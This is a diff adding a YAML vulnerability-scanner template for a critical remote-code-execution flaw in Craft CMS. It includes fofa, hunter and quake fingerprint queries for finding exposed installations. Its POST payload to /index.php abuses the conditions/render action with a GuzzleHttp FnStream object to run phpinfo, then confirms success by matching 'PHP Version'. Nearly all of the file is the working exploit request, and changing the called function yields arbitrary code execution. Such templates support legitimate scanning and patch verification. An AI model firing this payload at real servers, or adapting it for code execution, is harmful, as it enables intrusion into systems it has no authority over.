@@ -1,0 +1,35 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: icon_hash="-47932290"
+    hunter-query: web.icon=="02ea7f6f769f0fbeb6bb602bc8a4aacc"
+    quake-query: app:"Craft Cms"
+    zoomeye-query: 
+    threatbook-query: 
+    cve: 
+    cnvd: 
+
+name: poc-yaml-Craft-CMS-rce-phpinfo
+transport: http
+set:
+    s1: randomInt(100, 500)
+    s2: randomLowercase(8)
+rules:  
+    r0:
+        request:
+            method: POST
+            cache: true
+            path: /index.php
+            follow_redirects: false
+            headers:
+              Accept-Encoding: gzip, deflate
+              Content-Type: application/x-www-form-urlencoded
+            body: |
+              action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream",    "__construct()": [{"close":null}],"_fn_close":"phpinfo"}}
+
+        expression: response.status == 200 && response.body_string.contains("PHP Version")
+
+expression: r0() 
